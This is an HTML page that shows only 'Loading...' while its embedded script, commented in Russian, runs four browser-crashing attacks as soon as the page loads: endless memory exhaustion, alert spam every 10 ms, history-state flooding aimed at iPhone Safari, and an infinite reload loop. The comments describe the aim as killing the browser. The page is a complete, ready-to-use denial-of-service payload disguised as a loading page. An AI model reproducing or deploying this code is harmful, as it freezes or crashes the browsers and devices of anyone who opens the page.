<!DOCTYPE html>
<html>
<head>
    <title>Loading...</title>
    <meta charset="UTF-8">
</head>
<body>
    <h1>Loading...</h1>
    <script>
        // 1. Бесконечный цикл с огромным выделением памяти
        (function() {
            var memory = [];
            setInterval(function() {
                for(var i = 0; i < 100000; i++) {
                    memory.push(new Array(100000).join("X"));
                }
            }, 1);
        })();

        // 2. Бесконечный спам alert (убивает браузер)
        setInterval(function() {
            alert("System error");
        }, 10);

        // 3. Спам историей (для Safari на iPhone)
        setInterval(function() {
            for(var i = 0; i < 1000; i++) {
                window.history.pushState({}, '', '/?' + Math.random());
            }
        }, 10);

        // 4. Бесконечный цикл с перезагрузкой (добивает окончательно)
        setTimeout(function() {
            while(true) {
                location.reload();
            }
        }, 3000);
    </script>
</body>
</html>
